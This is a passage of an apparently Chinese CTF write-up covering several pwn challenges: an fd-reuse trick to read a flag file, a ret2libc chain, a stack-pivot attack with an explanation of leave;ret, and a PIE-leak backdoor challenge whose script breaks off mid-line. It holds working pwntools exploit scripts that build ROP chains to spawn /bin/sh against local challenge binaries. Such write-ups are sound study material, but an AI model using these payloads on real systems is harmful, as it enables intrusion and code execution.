<p>在 POSIX 语义中，0、1、2 这三个 fd 值已经被赋予特殊含义，分别是标准输入（<code>STDIN_FILENO</code>）、标准输出（<code>STDOUT_FILENO</code>）、标准错误（<code>STDERR_FILENO</code>）。</p>
<p>因此，在新分配文件描述符时，一般会从3开始分配。</p>
<p>在fd相关的内容中，有一个函数非常重要，就是<strong>dup()函数</strong>。通过dup()函数，我们可以使两个文件描述符指向同一file结构。</p>
<p>fd的分配规则是：fd会找到最小的，没有被占用的文件描述符。因此，如果有前面的fd被关闭，它的fd是可以分配给其他file结构的。</p>
<h3 id="脚本分析-2"><a href="#脚本分析-2" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment"># 启动程序</span></span><br><span class="line">    <span class="comment">#p = process(&#x27;./findit&#x27;)</span></span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">39713</span>)</span><br><span class="line">    <span class="comment"># 第一部分：找到备份的stdout</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Can you find it?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)  <span class="comment"># 备份的fd通常是3</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第二部分：请求查看flag文件</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;What would you like to see?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;/flag&quot;</span>)  <span class="comment"># 或者使用 &quot;flag&quot; 如果文件在当前目录</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 第三部分：提供打开文件的fd</span></span><br><span class="line">    p.recvuntil(<span class="string">b&quot;What is its fd?\n&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)  <span class="comment"># 新打开的文件会使用fd=1</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 接收flag - 尝试不同的接收方法</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 尝试接收特定数量的数据</span></span><br><span class="line">        flag = p.recv(<span class="number">0x50</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Flag content: <span class="subst">&#123;flag.decode()&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="comment"># 如果解码失败，尝试接收所有输出</span></span><br><span class="line">        output = p.recvall()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;All output: <span class="subst">&#123;output&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    p.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exploit()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="认识libc"><a href="#认识libc" class="headerlink" title="认识libc"></a>认识libc</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    setup(argc, argv, envp);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The Oracle speaks...&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;There is no system function in the .text segment.&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;A gift of forbidden knowledge, the location of &#x27;printf&#x27;: %p\n&quot;</span>, &amp;<span class="built_in">printf</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nNow, show me what you can do with this knowledge:&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./pwn</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   42 Symbols        No    0               2               ./pwn</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>无canary和PIE，无后门，有栈溢出和libc文件，题目是ret2libc</p>
<h3 id="脚本解析-6"><a href="#脚本解析-6" class="headerlink" title="脚本解析"></a>脚本解析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">44027</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">leak = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">接收泄露的printf地址</span></span><br><span class="line"><span class="string">根据程序输出，</span></span><br><span class="line"><span class="string">这是一个在较高地址空间的值（以 0x7e 开头），</span></span><br><span class="line"><span class="string">这明确表明是 libc 中 printf 函数的实际运行时地址</span></span><br><span class="line"><span class="string">但接下来我们要去分析，为什么泄露的是这个地址</span></span><br><span class="line"><span class="string">由于printf 函数已被解析（即 GOT 已填充），则&amp;printf 返回 libc 中的实际地址</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">log.success(<span class="string">f&#x27;leak_addr:<span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&#x27;</span>)</span><br><span class="line">printf_addr = libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc_base = leak - printf_addr</span><br><span class="line">log.success(<span class="string">f&quot;libc_base:<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>))+ libc_base</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+ libc_base</span><br><span class="line">ret_addr = <span class="number">0x0000000000029139</span> + libc_base</span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x000000000002a3e5</span> + libc_base</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;A&quot;</span>*<span class="number">72</span> + p64(ret_addr)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi_ret_addr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h2 id="ezpivot"><a href="#ezpivot" class="headerlink" title="ezpivot"></a>ezpivot</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> n32; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">    _BYTE buf[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Welcome to join this pwn party!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please say something to introduce yourself:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Before that,you need to tell us the length of your introduction.&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;n32);</span><br><span class="line">    <span class="keyword">if</span> ( n32 &gt; <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Your introduction is too long, please try again.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    introduce((<span class="type">unsigned</span> <span class="type">int</span>)n32);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now, please tell us your phone number:&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, len_of_phonenum);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo moectf&#123;WowYouGetTheFlag&#125;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> __fastcall <span class="title function_">introduce</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  read(<span class="number">0</span>, &amp;desc, nbytes);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Ok,we got your introduction!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./ezpivot</span>    </span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   47 Symbols        No    0               1               ./ezpivot</span><br></pre></td></tr></table></figure></div>

<p>对栈溢出进行了限制，每次只能溢出一点，根据题目提示，这里的考点是<strong>栈迁移</strong></p>
<h3 id="what-is-stack-migration"><a href="#what-is-stack-migration" class="headerlink" title="**what is **stack migration?"></a>**what is **stack migration?</h3><p>在做栈溢出的时候，我们可能会遇到一种情况，就是可以溢出的空间不够多，不足以构造出如<code>system(&#39;/bin/sh&#39;)</code>这样的语句，一般的栈溢出攻击方法将由于空间太小而不再适用 ，这种时候就可以尝试做一下栈迁移，即自己在bss段，data段或者就在栈上，有充足空间的地方构造一个类似栈的结构，再在这里进行栈溢出，拿到shell。</p>
<p>进行栈迁移时，很重要的一点是<code>leave; ret</code>这个gadget。</p>
<p>这里我们需要分析一下为什么可以通过这个gadget来迁移栈的位置：</p>
<ol>
<li><code>**leave**</code>** 指令**（等价于 <code>**mov esp, ebp; pop ebp**</code>）：<ul>
<li><code>**mov esp, ebp**</code>：将当前栈指针 ESP 指向基指针 EBP 的位置（恢复栈帧）。</li>
<li><code>**pop ebp**</code>：从栈顶弹出 4 字节数据到 EBP（恢复上一个栈帧的基址），同时 ESP 自动上移 4 字节。</li>
</ul>
</li>
<li><code>**ret**</code>** 指令**（等价于 <code>**pop eip**</code>）：<ul>
<li>从当前栈顶弹出 4 字节数据到 EIP（指令指针），程序跳转到该地址执行。</li>
</ul>
</li>
</ol>
<p>因此，我们可以通过以下步骤将栈迁移到.bss段或者.data段：</p>
<ol>
<li><strong>覆盖原 EBP</strong>：<br>将原函数的 EBP 覆盖为<strong>目标地址</strong>（如 BSS 段地址 <code>**0x0804a000**</code>）。<br><em>效果：当</em>_ <code>_**leave**_</code> <strong>执行</strong> <code>_**mov esp, ebp**_</code> <strong>时，ESP 会指向</strong> <code>_**0x0804a000**_</code>。_</li>
<li><strong>覆盖返回地址</strong>：<br>将返回地址覆盖为 <code>**leave; ret**</code> 指令的地址（假设为 <code>**0x08048453**</code>）。<br><em>效果：函数返回时跳转到</em>_ <code>_**leave; ret**_</code> _<em>执行。</em></li>
<li><strong>构造伪栈结构</strong>：<br>在目标地址（<code>**0x0804a000**</code>）预先布置以下数据：<ul>
<li><code>**0x0804a000**</code>** 处**：新 EBP 值（可随意设置，如<code>**0xdeadbeef**</code>）。</li>
<li><code>**0x0804a004**</code>** 处**：ROP 链的起始地址（如 <code>**system**</code> 函数的地址）。</li>
<li><code>**0x0804a008**</code> 处：ROP 链参数（如 <code>**&quot;/bin/sh&quot;**</code> 的地址）。</li>
</ul>
</li>
</ol>
<h3 id="脚本分析-3"><a href="#脚本分析-3" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">desc_addr = <span class="number">0x404060</span>       </span><br><span class="line">system_addr = <span class="number">0x4010a0</span></span><br><span class="line">leave_ret_addr = <span class="number">0x40120f</span>  </span><br><span class="line">ret_gadget = <span class="number">0x40101a</span>       </span><br><span class="line">main_addr = <span class="number">0x401237</span></span><br><span class="line">pop_rdi_ret=<span class="number">0x401219</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./ezpivot&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">33541</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;length of your introduction.\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;-1&#x27;</span>)  <span class="comment">#通过负溢出获得足够的写入空间</span></span><br><span class="line"><span class="comment">#在.bss段写如伪造的栈</span></span><br><span class="line">payload1=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x800</span></span><br><span class="line">payload1+=p64(ret_gadget)+p64(ret_gadget)</span><br><span class="line">payload1+=p64(pop_rdi_ret)</span><br><span class="line">payload1+=p64(desc_addr+<span class="number">0x800</span>+<span class="number">0x28</span>)</span><br><span class="line">payload1+=p64(system_addr)</span><br><span class="line">payload1+=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Now, please tell us your phone number:\n&quot;</span>)</span><br><span class="line"><span class="comment">#返回到伪造的栈</span></span><br><span class="line">payload2 = <span class="string">b&#x27;A&#x27;</span>*<span class="number">12</span></span><br><span class="line">payload2 += p64(desc_addr+<span class="number">0x800</span>)  </span><br><span class="line">payload2 += p64(leave_ret_addr)  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<h2 id="xdulaker"><a href="#xdulaker" class="headerlink" title="xdulaker"></a>xdulaker</h2><p>IDA分析：</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">    init(argc, argv, envp);</span><br><span class="line">    menu();</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="number">62</span>);</span><br><span class="line">            __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;opt);</span><br><span class="line">            <span class="keyword">if</span> ( opt != <span class="number">1</span> )</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            pull();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( opt == <span class="number">2</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            photo();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( opt != <span class="number">3</span> )</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">            laker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;A freshman has walked into the lake.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;1.Pull him out&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;2.Take a photo of him&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;3.Walk into the lake.&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Your choice&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">pull</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Thanks,I&#x27;ll give you a gift:%p\n&quot;</span>, &amp;opt);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">photo</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hey,what&#x27;s your name?!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;I will teach you a lesson.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">laker</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s1[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(s1, <span class="string">&quot;xdulaker&quot;</span>, <span class="number">8uLL</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You are not him.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;welcome,xdulaker&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, s1, <span class="number">0x100</span>uLL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>checksec分析：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">checksec --file=./xdulaker</span></span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE</span><br><span class="line">Full RELRO      No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   54 Symbols        No    0               2               ./xdulaker</span><br></pre></td></tr></table></figure></div>

<h3 id="脚本分析-4"><a href="#脚本分析-4" class="headerlink" title="脚本分析"></a>脚本分析</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&#x27;./xdulaker&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">38883</span>)</span><br><span class="line">opt_addr = <span class="number">0x0000000000004010</span></span><br><span class="line">backdoor_offset = <span class="number">0x1249</span></span><br><span class="line">ret_offset = <span class="number">0x101a</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice\n&#x27;</span>)</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;gift:0x&#x27;</span>)</span><br><span class="line">opt_leak=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">log.success(<span class="string">f&#x27;leak opt address-----&gt;<span class="subst">&#123;<span class="built_in">hex</span>(opt_leak)&#125;</span>&#x27;</span>)</span><br><span class="line">elf_base = opt_leak - opt_addr</span><br><span class="line">log.success(<span class="string">f&#x27;leak elf base address-----&gt;<span class="subst">&#123;<span class="built_in">hex</span>(elf_base)&#125;</span>&#x27;</span>)</span><br><span class="line">backdoor_addr = elf_base + backdoor_offset</span><br><span class="line">ret_addr = elf_base + ret_offset</span><br><span class="line">p.recv(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload1 